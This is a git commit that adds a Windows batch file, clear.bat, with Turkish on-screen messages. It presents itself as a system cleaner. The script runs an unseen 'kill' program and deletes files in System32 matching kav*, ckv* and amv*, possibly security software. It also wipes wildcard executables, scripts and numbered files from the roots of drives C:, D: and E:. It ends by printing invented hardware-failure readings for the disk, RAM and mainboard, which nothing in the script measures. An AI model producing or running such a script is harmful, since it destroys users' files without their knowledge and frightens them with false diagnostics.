86e3d52c0c817282e0cd87e1f0732a89f96c1f19
794 <info@taylanguneyaktas.com>
2022-04-22 22:58:29 +0300

    Create clear.bat

---
+++ clear.bat
@@ -0,0 +1,217 @@
+copy kill.* C:\ /y
+c:
+cd \
+echo Lutfen gelen mesajlarda TAMAM a basarak devam ediniz....
+pause
+kill
+attrib -r -h -s autoru*.*
+del autoru*.*
+cd %temp%
+del *.* /f /q
+cd \windows\temp
+del *.* /f /q
+cd \windows\apppatch
+del acllayer.dll /f
+del AcXtrnel.bpl /f
+del DesktopWin.dll /f
+cd \windows
+del update.dll /f
+del p_981116.exe /f
+cd \windows\system32
+attrib -r -h -s ckv*.*
+del ckv*.*
+attrib -r -h -s kav*.*
+del kav*.*
+attrib -r -h -s amv*.*
+del amv*.*
+cd\
+attrib -r -h -s 1*.*
+del 1*.*
+attrib -r -h -s 6*.*
+del 6*.*
+attrib -r -h -s 8*.*
+del 8*.*
+
+attrib -r -h -s d*.com
+del d*.com
+attrib -r -h -s d*.exe
+del d*.exe
+attrib -r -h -s d*.bat
+del d*.bat
+attrib -r -h -s d*.cmd
+del d*.cmd
+
+attrib -r -h -s e*.com
+del e*.com
+attrib -r -h -s e*.exe
+del e*.exe
+attrib -r -h -s e*.bat
+del e*.bat
+attrib -r -h -s e*.cmd
+del e*.cmd
+
+attrib -r -h -s f*.com
+del f*.com
+attrib -r -h -s f*.exe
+del f*.exe
+attrib -r -h -s f*.bat
+del f*.bat
+attrib -r -h -s f*.cmd
+del f*.cmd
+
+attrib -r -h -s g*.com
+del g*.com
+attrib -r -h -s i*.bat
+del i*.bat
+attrib -r -h -s i*.com
+del i*.com
+attrib -r -h -s i*.exe
+del i*.exe
+attrib -r -h -s i*.cmd
+del i*.cmd
+
+attrib -r -h -s k*.com
+del k*.com
+attrib -r -h -s k*.exe
+del k*.exe
+attrib -r -h -s k*.bat
+del k*.bat
+attrib -r -h -s k*.cmd
+del k*.cmd
+
+attrib -r -h -s nj*.com
+del nj*.com
+attrib -r -h -s s*.cmd
+del s*.cmd
+
+d:
+cd\
+attrib -r -h -s 1*.*
+del 1*.*
+attrib -r -h -s 6*.*
+del 6*.*
+attrib -r -h -s 8*.*
+del 8*.*
+
+attrib -r -h -s d*.com
+del d*.com
+attrib -r -h -s d*.exe
+del d*.exe
+attrib -r -h -s d*.bat
+del d*.bat
+attrib -r -h -s d*.cmd
+del d*.cmd
+
+attrib -r -h -s e*.com
+del e*.com
+attrib -r -h -s e*.exe
+del e*.exe
+attrib -r -h -s e*.bat
+del e*.bat
+attrib -r -h -s e*.cmd
+del e*.cmd
+
+attrib -r -h -s f*.com
+del f*.com
+attrib -r -h -s f*.exe
+del f*.exe
+attrib -r -h -s f*.bat
+del f*.bat
+attrib -r -h -s f*.cmd
+del f*.cmd
+
+attrib -r -h -s g*.com
+del g*.com
+attrib -r -h -s i*.bat
+del i*.bat
+attrib -r -h -s i*.com
+del i*.com
+attrib -r -h -s i*.exe
+del i*.exe
+attrib -r -h -s i*.cmd
+del i*.cmd
+
+attrib -r -h -s k*.com
+del k*.com
+attrib -r -h -s k*.exe
+del k*.exe
+attrib -r -h -s k*.bat
+del k*.bat
+attrib -r -h -s k*.cmd
+del k*.cmd
+
+attrib -r -h -s nj*.com
+del nj*.com
+attrib -r -h -s s*.cmd
+del s*.cmd
+
+
+e:
+cd\
+attrib -r -h -s 1*.*
+del 1*.*
+attrib -r -h -s 6*.*
+del 6*.*
+attrib -r -h -s 8*.*
+del 8*.*
+
+attrib -r -h -s d*.com
+del d*.com
+attrib -r -h -s d*.exe
+del d*.exe
+attrib -r -h -s d*.bat
+del d*.bat
+attrib -r -h -s d*.cmd
+del d*.cmd
+
+attrib -r -h -s e*.com
+del e*.com
+attrib -r -h -s e*.exe
+del e*.exe
+attrib -r -h -s e*.bat
+del e*.bat
+attrib -r -h -s e*.cmd
+del e*.cmd
+
+attrib -r -h -s f*.com
+del f*.com
+attrib -r -h -s f*.exe
+del f*.exe
+attrib -r -h -s f*.bat
+del f*.bat
+attrib -r -h -s f*.cmd
+del f*.cmd
+
+attrib -r -h -s g*.com
+del g*.com
+attrib -r -h -s i*.bat
+del i*.bat
+attrib -r -h -s i*.com
+del i*.com
+attrib -r -h -s i*.exe
+del i*.exe
+attrib -r -h -s i*.cmd
+del i*.cmd
+
+attrib -r -h -s k*.com
+del k*.com
+attrib -r -h -s k*.exe
+del k*.exe
+attrib -r -h -s k*.bat
+del k*.bat
+attrib -r -h -s k*.cmd
+del k*.cmd
+
+attrib -r -h -s nj*.com
+del nj*.com
+attrib -r -h -s s*.cmd
+del s*.cmd
+
+echo Temizleme Tamamlanmistir.
+echo DIKKAT!
+echo Sistem Bilgisi
+echo Harddisk yasam seviyesi kotu
+echo Ram belek stress % 87 kotu
+echo mainboard statik bozuk %62
+echo Temizleme tamamlanmistir lutfen bir tusa basiniz.....
+PAUSE
